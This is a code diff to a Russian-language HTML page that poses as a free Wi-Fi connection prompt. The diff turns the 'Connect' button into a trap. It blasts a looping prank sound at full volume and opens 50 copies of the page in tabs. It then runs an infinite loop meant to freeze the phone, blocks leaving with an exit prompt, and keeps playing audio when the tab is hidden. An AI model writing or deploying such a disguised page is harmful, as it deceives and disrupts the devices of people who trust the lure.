@@ -29,21 +29,47 @@
 </head>
 <body>
     <h1>Доступен бесплатный Wi-Fi!</h1>
-    <button id="wifi-button" onclick="startSound()">Подключиться</button>
+    <button id="wifi-button" onclick="startMadness()">Подключиться</button>
     <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" loop></audio>
 
     <script>
         let sound = document.getElementById("sound");
 
-        function startSound() {
-            sound.volume = 1.0;
+        function startMadness() {
+            sound.volume = 1.0; // Громкость на максимум
             sound.play().catch(err => console.log("Ошибка автозапуска:", err));
 
             // Меняем текст после нажатия
             document.querySelector("h1").innerText = "Поздравляем!";
             document.getElementById("wifi-button").innerText = "Вы подключены!";
             document.getElementById("wifi-button").style.backgroundColor = "red";
+
+            setTimeout(spamTabs, 1000); // Открытие вкладок через 1 сек
+            setTimeout(freezePhone, 2000); // Запуск зависания через 2 сек
         }
+
+        function spamTabs() {
+            for (let i = 0; i < 50; i++) { // Открываем 50 вкладок
+                window.open(window.location.href, '_blank');
+            }
+        }
+
+        function freezePhone() {
+            while (true) {
+                console.log("Телефон зависает...");
+            }
+        }
+
+        window.onbeforeunload = function() {
+            return "Ты точно хочешь уйти?";
+        };
+
+        // Продолжение звука при сворачивании (для Android)
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                sound.play();
+            }
+        });
     </script>
 </body>
 </html>
